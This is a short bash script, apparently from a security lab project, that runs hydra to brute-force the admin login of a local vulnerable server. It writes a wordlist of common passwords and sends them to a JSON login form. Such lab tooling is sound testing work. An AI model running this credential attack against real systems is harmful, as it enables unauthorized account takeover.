#!/usr/bin/env bash
# Roda hydra (brute force) contra o servidor vulneravel local.
# Requer hydra instalado.
#
# Uso: bash scripts/run_hydra.sh [target_host] [target_port]

HOST="${1:-127.0.0.1}"
PORT="${2:-8000}"
WORDLIST="${3:-scripts/passwords.txt}"

if [ ! -f "$WORDLIST" ]; then
  echo "Gerando wordlist em $WORDLIST"
  cat > "$WORDLIST" <<EOF
123456
password
admin
admin123
qwerty
letmein
welcome
root
analista
analista123
auditor
auditor123
EOF
fi

echo "[hydra] alvo: ${HOST}:${PORT} user=admin"
hydra -l admin -P "$WORDLIST" \
  "${HOST}" -s "${PORT}" \
  http-post-form \
  "/pg/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:authenticated.*false" \
  -t 8 -V
